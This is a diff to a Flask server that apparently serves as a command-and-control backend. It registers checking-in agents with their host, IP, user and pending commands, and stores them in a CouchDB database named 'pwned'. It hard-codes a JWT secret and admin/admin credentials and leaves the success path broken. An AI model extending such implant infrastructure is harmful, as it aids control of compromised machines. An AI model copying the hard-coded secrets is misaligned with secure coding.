@@ -13,6 +13,30 @@ app = Flask(__name__)
 app.config['JWT_SECRET_KEY'] = 'dawoof7123'
 jwt = JWTManager(app)
 
+
+def generate_token(agent_id):
+	access_token = create_access_token(identity=agent_id)
+	print(access_token)
+	return access_token
+
+def connect_db():
+	dbuser = "admin"
+	dbpass = "admin"
+	db_ip = "127.0.0.1"
+	db_port = "5984"
+	try:
+	  couchserver = couchdb.Server("http://{}:{}@{}:{}".format(dbuser,dbpass,db_ip,db_port))
+	  db_connection = couchserver['pwned']
+	  return db_connection
+
+	except:
+		return jsonify({"Error":"CouchDB Server Not up or pwned db not setup, start the couchdb docker container and run the setup script"})
+
+#def send_to_db():
+
+
+
+
 @app.route('/first_check_in', methods = ['POST'])
 def first_checkin():
 	print(request)
@@ -32,17 +56,14 @@ def first_checkin():
 	  os = content['os']
 	  ip = content['ip']
 	  user = content['user']
+	  completed_commands = content['completed_commands']
+	  pending_commands = content['pending_commands']
 	  token = generate_token(agent_id)
-	  return jsonify(access_token=token)
+	  #return jsonify(access_token=token)
+	  #db_con = connect_db()
+	  #db_con.save(content)
 	except:
 	  return jsonify({"Error":"Missing Parameters"})
-
-
-def generate_token(agent_id):
-	print("the function that actually generates the json token")
-	access_token = create_access_token(identity=agent_id)
-	print(access_token)
-	return access_token
 
 
 
